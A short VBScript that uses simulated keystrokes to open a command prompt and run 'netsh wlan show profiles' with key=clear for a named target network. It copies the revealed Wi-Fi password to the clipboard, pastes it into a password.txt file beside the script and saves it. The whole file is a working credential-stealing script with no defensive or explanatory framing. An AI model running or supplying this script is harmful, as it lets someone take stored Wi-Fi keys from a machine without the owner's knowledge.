Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

Dim wifiName
wifiName = "targetwifiname"
Dim notepadFileName
notepadFileName = "password.txt"

Set x = CreateObject("WScript.Shell")

x.SendKeys "^{ESC}"
WScript.Sleep(1000)

x.SendKeys "cmd"
WScript.Sleep(500)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

x.SendKeys "netsh wlan show profiles """ & wifiName & """ key=clear | clip"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

strFilePath = objFSO.BuildPath(strScriptDir, notepadFileName)

If objFSO.FileExists(strFilePath) Then
    objShell.Run "notepad.exe " & strFilePath
Else
    WScript.Echo "File not found: " & strFilePath
End If

WScript.Sleep(2000)

x.SendKeys "^v"
WScript.Sleep(100)

x.SendKeys "^s"
WScript.Sleep(100)

x.SendKeys "%{F4}"
WScript.Sleep(1000)
